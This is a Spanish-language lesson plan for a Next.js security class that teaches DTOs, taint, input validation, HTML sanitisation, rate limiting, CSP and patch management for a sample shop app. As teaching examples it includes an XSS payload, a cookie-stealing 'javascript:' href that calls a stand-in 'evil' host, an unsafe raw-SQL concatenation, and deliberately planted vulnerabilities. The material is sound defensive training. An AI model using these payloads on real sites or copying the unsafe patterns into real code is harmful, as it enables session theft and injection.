# Clase 18 — Seguridad a fondo

**Duración:** 2:30 hs
**Branch de salida:** `clase-18-seguridad`
**Lo que se llevan:** un modelo de amenazas específico de Next (dónde se filtran datos, qué es público aunque no parezca), las defensas aplicadas a Comarca (DTOs, taint, validación de todo input, sanitización, rate limit, headers, CSP con sus costos reales), el manejo de secretos y el proceso para no quedar expuestos a la próxima vulnerabilidad del framework.

**Requisito:** tag `clase-17`.

---

## Guion de la clase

| Tiempo | Qué pasa |
|---|---|
| 0:00 – 0:15 | Ejercicio: atacar Comarca (5 vulnerabilidades plantadas) |
| 0:15 – 0:35 | Modelo de amenazas de una app Next |
| 0:35 – 0:55 | Fugas de datos: DTOs, taint, payload RSC |
| 0:55 – 1:15 | Input: params, cookies, FormData, markdown, URLs |
| 1:15 – 1:35 | Rate limit con Redis |
| 1:35 – 2:00 | Headers de seguridad y CSP: nonce vs PPR |
| 2:00 – 2:20 | Secretos, imágenes y dependencias: el historial de CVEs de Next |
| 2:20 – 2:30 | Checklist de auditoría + tarea |

---

## Bloque 1 — Ejercicio: atacar Comarca (15 min)

Antes de la clase, creá el branch `clase-18-vulnerable` con estas 5 fallas plantadas. Los chicos, en parejas, tienen 15 minutos para encontrarlas usando solo el navegador, DevTools y `curl`:

1. `ProductDetail` (cliente) recibe el objeto de Prisma entero → en el RSC payload está `producer.owner.email`.
2. Una action `deleteReview(reviewId)` que verifica sesión pero **no** que la reseña sea del usuario.
3. La descripción del producto se renderiza con `marked` sin sanitizar → un productor puede meter `<img src=x onerror=alert(1)>`.
4. `/api/v1/orders?userId=...` que confía en el query param.
5. `?next=` del login sin validar (ya lo arreglamos en la 17, pero en este branch está roto).

> "Ninguna requiere herramientas raras. Las cinco son errores que vi en proyectos reales. Hoy aprendemos a que no lleguen a producción."

---

## Bloque 2 — Modelo de amenazas de una app Next (20 min)

Dibujá las superficies de ataque. Todo lo que está en **rojo** es público aunque no tenga una URL "linda":

```text
                ┌──────────────── Internet ────────────────┐
                │                                          │
   GET /es/...  │  POST /es/... (Next-Action: <id>)        │  /api/*
        │       │         │                                │    │
        ▼       │         ▼                                │    ▼
     [proxy]    │   [Server Actions] ← endpoints públicos  │ [Route Handlers]
        │       │         │                                │    │
        ▼       │         │                                │    │
   [Server Components] ───┼──── RSC payload ───▶ navegador │    │
        │                 │     (todas las props de        │    │
        │                 │      Client Components)        │    │
        ▼                 ▼                                │    ▼
                      [ DAL ] ───────▶ Postgres / Redis / APIs
```

| Superficie | Riesgo típico | Defensa |
|---|---|---|
| Props de Client Components | Filtrar campos privados | DTOs, taint |
| Server Actions | Sin auth/authz, input sin validar, IDOR | `requireUser` + filtro por dueño + Zod, en cada una |
| Route Handlers | Ídem + CORS abierto | Ídem + lista blanca |
| `[param]`, `searchParams`, cookies | Input malicioso | Zod |
| `proxy.ts` | Usarlo como única barrera | Defensa en profundidad |
| `'use cache'` | Cachear datos de un usuario en cache compartida | Patrón de función no exportada, `private` |
| HTML de usuario | XSS | Sanitizar |
| Dependencias | CVEs del framework | Proceso de actualización |

La doc oficial ("Data Security") recomienda auditar especialmente: la DAL, los archivos `'use client'` (¿qué props reciben?), los `'use server'` (¿validan, autorizan, filtran el retorno?), las carpetas `[param]` y los `proxy.ts`/`route.ts`.

---

## Bloque 3 — Fugas de datos (20 min)

### 3.1 — Ver lo que viaja

En la vulnerabilidad 1: Network → el request del documento (o el `?_rsc=` de una navegación) → buscar `@`. Ahí está el email.

> "Todo lo que un Server Component le pasa a un Client Component es **público**. No importa si el componente lo muestra o no."

### 3.2 — DTOs (ya los tienen desde la clase 6)

La defensa principal. Repasá que **ningún** DTO de la DAL tenga campos que el cliente no necesita.

### 3.3 — Taint: el cinturón de seguridad

React permite "marcar" objetos o valores para que **fallen** si alguien intenta pasarlos a un Client Component.

```ts
// next.config.ts
experimental: { taint: true },
```

```ts
// src/server/dal/users.ts
import 'server-only'
import { experimental_taintObjectReference, experimental_taintUniqueValue } from 'react'

export async function getUserRowForInternalUse(id: string) {
  const row = await db.user.findUnique({ where: { id } })
  if (row) {
    experimental_taintObjectReference('No pases la fila de usuario al cliente; usá un DTO', row)
  }
  return row
}
```

```ts
// src/server/auth.ts (al iniciar)
experimental_taintUniqueValue('No pases el secreto de auth al cliente', process, env.BETTER_AUTH_SECRET)
```

Si alguien hace `<ClientThing user={row} />`, el render tira error con ese mensaje.

> "Es experimental y es una **segunda** capa. La primera sigue siendo no devolver de más. Pero en un equipo de 8 personas, el día que alguien se equivoca, el taint lo frena en dev."

### 3.4 — Retornos de Server Actions

Lo mismo aplica a lo que **devuelve** una action: se serializa y viaja. Devuelvan `{ ok: true }` o el DTO mínimo, nunca el resultado de `db.x.update()`.

---

## Bloque 4 — Input (20 min)

### 4.1 — Params validados

```ts
// src/lib/validate.ts
import { z } from 'zod'
import { notFound } from 'next/navigation'

export const slugSchema = z.string().regex(/^[a-z0-9-]{1,80}$/)
export const idSchema = z.cuid()

/** Para segmentos dinámicos: input inválido = 404, no 500. */
export function parseOr404<T>(schema: z.ZodType<T>, value: unknown): T {
  const r = schema.safeParse(value)
  if (!r.success) notFound()
  return r.data
}
```

```tsx
const { slug: rawSlug } = await props.params
const slug = parseOr404(slugSchema, rawSlug)
```

> "Un slug con 5.000 caracteres o con `%00` no debería llegar a Prisma. No porque Prisma sea vulnerable a inyección (usa queries parametrizadas), sino porque **cada capa que atraviesa input basura es superficie de bugs**."

### 4.2 — `$queryRaw` y la única forma segura

```ts
// ✅ tagged template: parametrizado
await db.$queryRaw`SELECT * FROM products WHERE slug = ${slug}`

// ❌ string concatenado: inyección SQL
await db.$queryRawUnsafe(`SELECT * FROM products WHERE slug = '${slug}'`)
```

### 4.3 — HTML de usuario: sanitizar

La descripción de producto la escribe el productor (markdown). `marked` convierte a HTML **sin sanitizar**.

```bash
npm i sanitize-html && npm i -D @types/sanitize-html
```

```ts
// src/server/markdown.ts
import 'server-only'
import { marked } from 'marked'
import sanitizeHtml from 'sanitize-html'

export async function renderUserMarkdown(md: string) {
  const html = await marked.parse(md, { async: true })
  return sanitizeHtml(html, {
    allowedTags: ['p', 'br', 'strong', 'em', 'ul', 'ol', 'li', 'h2', 'h3', 'blockquote', 'a'],
    allowedAttributes: { a: ['href', 'rel', 'target'] },
    allowedSchemes: ['https', 'mailto'],             // nada de javascript:
    transformTags: {
      a: sanitizeHtml.simpleTransform('a', { rel: 'nofollow noopener noreferrer', target: '_blank' }),
    },
  })
}
```

> "Sanitizamos **en el servidor**, y como `renderUserMarkdown` se llama dentro de un componente cacheado, el costo se paga una vez por versión de la descripción, no por visita."

### 4.4 — URLs de usuario

React escapa texto, pero **no** valida `href`:

```tsx
<a href={producer.website}>Sitio</a>   // si website = "javascript:fetch('//evil?c='+document.cookie)"
```

```ts
const websiteSchema = z.url().refine((u) => u.startsWith('https://'), 'Solo https')
```

Validalo **al guardar** (schema del form) y al mostrar.

---

## Bloque 5 — Rate limit (20 min)

Better Auth ya limita los endpoints de login. Nos falta: registro de reseñas, checkout, búsqueda de la API pública y el webhook.

```ts
// src/server/rate-limit.ts
import 'server-only'
import { createClient } from 'redis'
import { headers } from 'next/headers'
import { env } from '@/lib/env/server'

const g = globalThis as unknown as { redis?: ReturnType<typeof createClient> }
const redis = g.redis ?? createClient({ url: env.REDIS_URL })
if (!g.redis) {
  g.redis = redis
  redis.connect().catch((e) => console.error('[rate-limit] redis', e))
}

/** Ventana fija. Suficiente para la mayoría de los casos; para ráfagas, ventana deslizante. */
export async function rateLimit(key: string, limit: number, windowSeconds: number) {
  try {
    const bucket = `rl:${key}:${Math.floor(Date.now() / 1000 / windowSeconds)}`
    const count = await redis.incr(bucket)
    if (count === 1) await redis.expire(bucket, windowSeconds)
    return { ok: count <= limit, remaining: Math.max(0, limit - count) }
  } catch {
    return { ok: true, remaining: -1 } // si Redis cae, no tiramos la tienda (decisión: fail-open)
  }
}

/** IP del cliente. Solo confiable si hay un proxy reverso nuestro que setea el header (Traefik/Coolify). */
export async function clientIp() {
  const h = await headers()
  return h.get('x-forwarded-for')?.split(',')[0]?.trim() || h.get('x-real-ip') || 'unknown'
}
```

Uso en una action:

```ts
export async function placeOrderAction(_prev: CheckoutState): Promise<CheckoutState> {
  const user = await requireUser()
  const rl = await rateLimit(`checkout:${user.id}`, 5, 60)
  if (!rl.ok) return { error: 'too_many_requests' }
  // ...
}
```

Uso en un handler:

```ts
const rl = await rateLimit(`api:products:${await clientIp()}`, 120, 60)
if (!rl.ok) return Response.json({ error: 'rate_limited' }, { status: 429, headers: { 'Retry-After': '60' } })
```

> "Dos decisiones que tienen que tomar a conciencia: **la clave** (por usuario si hay sesión; por IP si no, sabiendo que detrás de un NAT hay muchos usuarios) y **fail-open vs fail-closed** (si Redis cae, ¿dejamos pasar o bloqueamos?). Para checkout de una tienda, fail-open. Para un endpoint que manda SMS pagos, fail-closed."

`x-forwarded-for` lo puede mandar cualquiera. Es confiable **solo** si nuestro proxy reverso lo sobrescribe (lo configuramos en la clase 22).

---

## Bloque 6 — Headers y CSP (25 min)

### 6.1 — Headers que van siempre

```ts
// next.config.ts
const securityHeaders = [
  { key: 'Strict-Transport-Security', value: 'max-age=63072000; includeSubDomains; preload' },
  { key: 'X-Content-Type-Options', value: 'nosniff' },
  { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
  { key: 'Permissions-Policy', value: 'camera=(), microphone=(), geolocation=()' },
  { key: 'X-Frame-Options', value: 'DENY' },
]

const nextConfig: NextConfig = {
  // ...
  poweredByHeader: false,
  async headers() {
    return [{ source: '/(.*)', headers: securityHeaders }]
  },
}
```

**Validación:** `curl -sI localhost:3000/es | grep -iE 'strict|nosniff|referrer|permissions|frame'` y https://securityheaders.com cuando esté desplegado.

### 6.2 — CSP: la decisión difícil

Content Security Policy le dice al navegador de dónde puede cargar scripts, estilos, imágenes. La versión "estricta" usa un **nonce** por request:

```ts
// proxy.ts (versión con nonce, de la doc)
const nonce = Buffer.from(crypto.randomUUID()).toString('base64')
const csp = `default-src 'self'; script-src 'self' 'nonce-${nonce}' 'strict-dynamic'; ...`
// se setea en el request (para que Next lo aplique a sus scripts) y en la respuesta
```

**El costo, en palabras de la doc:** con nonces, **todas las páginas tienen que renderizarse dinámicamente**, y **Partial Prerendering es incompatible** con CSP por nonce (el shell estático se generó en build, cuando no había nonce). Es decir: perdemos el static shell que construimos en las clases 9–12.

Las opciones reales:

| Opción | Seguridad | Costo | Para |
|---|---|---|---|
| CSP sin nonce en `next.config` (`script-src 'self' 'unsafe-inline'`, más `frame-ancestors`, `object-src 'none'`, `base-uri`, `form-action`) | Media: frena inyección de scripts externos, clickjacking, `<base>` | Ninguno, PPR intacto | Páginas públicas de Comarca |
| SRI experimental (`experimental.sri`) + CSP basada en hashes | Alta para scripts de Next | Experimental; validar en navegador | Probar en staging |
| Nonce en el proxy, **solo** para un grupo de rutas | Alta | Esas rutas pasan a dinámicas (`await connection()` en su layout) | `/checkout` (datos de pago) |

Decisión para Comarca:

```ts
// next.config.ts — CSP base para todo el sitio (sin nonce)
const isDev = process.env.NODE_ENV === 'development'
const csp = [
  "default-src 'self'",
  `script-src 'self' 'unsafe-inline'${isDev ? " 'unsafe-eval'" : ''}`,
  "style-src 'self' 'unsafe-inline'",
  "img-src 'self' blob: data: https://*.comarca-media.com",
  "font-src 'self'",
  "connect-src 'self'",
  "frame-src https://www.mercadopago.com.ar",
  "object-src 'none'",
  "base-uri 'self'",
  "form-action 'self' https://www.mercadopago.com.ar",
  "frame-ancestors 'none'",
  'upgrade-insecure-requests',
].join('; ')

// en headers(): { key: 'Content-Security-Policy', value: csp }
```

Y el checkout con nonce estricto como ejercicio guiado (tarea 4).

> "Seguridad es elegir con los costos a la vista. La respuesta 'nonce en todo el sitio' suena mejor y les tira abajo la performance que trabajaron 4 clases. La respuesta 'sin CSP' deja abierto el clickjacking. Lo profesional es la tabla de arriba y una decisión documentada."

(En dev, React necesita `'unsafe-eval'` para reconstruir stacks de errores del servidor; en producción no.)

---

## Bloque 7 — Secretos, imágenes y dependencias (20 min)

### 7.1 — Secretos

- Solo la DAL y `src/server/*` leen `process.env` (regla de la doc). Las `NEXT_PUBLIC_*` son públicas por definición.
- `.env*` fuera del repo; `.env.example` sin valores.
- **`NEXT_SERVER_ACTIONS_ENCRYPTION_KEY`**: con más de una instancia (clase 22), todas tienen que cifrar las closures de las actions con la misma clave. `openssl rand -base64 32`.
- Rotación: `BETTER_AUTH_SECRET` rotado = todas las sesiones invalidadas. Planifíquenlo.

### 7.2 — Imágenes

`next/image` con orígenes remotos es un **proxy** de imágenes: mal configurado, sirve para SSRF.

```ts
images: {
  remotePatterns: [{ protocol: 'https', hostname: 'media.comarca.com', pathname: '/products/**' }],
  // dangerouslyAllowLocalIP: false   ← default en 16: no optimiza IPs locales (anti-SSRF)
  // dangerouslyAllowSVG: false       ← default: no optimizar SVG de terceros
  maximumRedirects: 3,              // default en 16
},
```

Nada de `hostname: '**'`. (`images.domains` está deprecado: usen `remotePatterns`.)

### 7.3 — El historial reciente (cuéntenlo, es la mejor motivación)

| Fecha | Qué | Impacto |
|---|---|---|
| Mar 2025 | **CVE-2025-29927** | Saltear el middleware con un header interno. Apps que protegían solo con middleware quedaron abiertas (clase 7) |
| Dic 2025 | **CVE-2025-66478** | Ejecución remota de código en el protocolo de React Server Components. Crítica |
| Dic 2025 | Dos vulnerabilidades más en RSC (11/12) | Parche inmediato |
| Sep 2026 | Security release de septiembre | Varias fixes |
| 14 Oct 2026 | **GHSA-673q-mjm6-r5xr**: RCE sin auth en `'use cache'` que devuelve typed arrays | Sin workaround: actualizar a 16.4.1 |
| 14 Oct 2026 | **CVE-2026-96889**: RCE en Image Optimization con SVG (librería upstream, glibc) | Actualizar; `sharp` ≥ 0.35.5 |
| 14 Oct 2026 | DoS con Server Actions | Actualizar |

> "Tres de estas son **ejecución remota de código sin autenticación**. No importa lo bien que escriban su código: si el framework tiene el agujero, el atacante entra. La única defensa es **actualizar rápido**."

### 7.4 — El proceso

1. Suscribirse a https://nextjs.org/blog/security (o al feed de GitHub Security Advisories de `vercel/next.js`).
2. Renovate o Dependabot con PRs automáticos para `next`, `react`, `react-dom`.
3. `npm audit --omit=dev` en CI (clase 22), que falle con `high` o más.
4. Next 16.4 trae `experimental.agentUpgrade` con política `'security'` por defecto: `next dev`/`next build` avisan cuando hay una actualización que corrige una vulnerabilidad de tu versión, y `npx next@canary upgrade --agent` prepara la migración para un agente.
5. SLA del equipo: parche crítico en producción en **menos de 24 h**.

---

## Checklist de auditoría (pegala en el repo como `SECURITY-CHECKLIST.md`)

```text
DAL
□ Solo src/server/** importa db y lee process.env
□ Ninguna función de la DAL devuelve tipos de Prisma; todas devuelven DTOs
□ Funciones con datos de usuario resuelven el usuario adentro (requireUser)
□ Funciones cacheadas por userId NO están exportadas

'use client'
□ Ninguna prop recibe objetos de la base enteros
□ Ningún import de src/server/** (server-only lo garantiza)

'use server'
□ Zod en todos los argumentos (incluidos bind)
□ requireUser/requireProducer adentro
□ Filtro por dueño en escrituras
□ Retorno mínimo; errores inesperados se lanzan sin mensaje al cliente
□ Rate limit en las caras

route.ts
□ Auth adentro; CORS con lista blanca; webhooks con firma + tiempo constante + anti-replay
□ Idempotencia en webhooks

[params] / searchParams / cookies
□ Validados con Zod; inválido = 404 / vacío, nunca 500

HTML / URLs de usuario
□ Markdown sanitizado; hrefs solo https/mailto

Infra
□ Headers de seguridad; CSP documentada; images.remotePatterns acotado
□ NEXT_SERVER_ACTIONS_ENCRYPTION_KEY compartida entre instancias
□ next ≥ última versión parcheada; Renovate activo; npm audit en CI
```

---

## Tarea

1. Arreglá las 5 vulnerabilidades del branch `clase-18-vulnerable` con un commit por cada una y un test que la reproduzca.
2. `renderUserMarkdown` en descripciones de producto y productor; test con payloads XSS conocidos (`<img onerror>`, `javascript:`, `<svg onload>`).
3. Rate limit en: sign up (por IP), checkout (por usuario), reseñas (por usuario), API pública (por IP).
4. CSP con nonce **solo** en `/[locale]/checkout`: matcher del proxy que genere el nonce para esa ruta, `await connection()` en el layout del checkout, y verificación en la consola del navegador de que no hay violaciones.
5. `SECURITY-CHECKLIST.md` completado para todo el repo, con lo que falte marcado como issue.

**Terminado cuando:** los tests de las 5 vulnerabilidades pasan y https://securityheaders.com (en el deploy de la clase 22) da A o más.
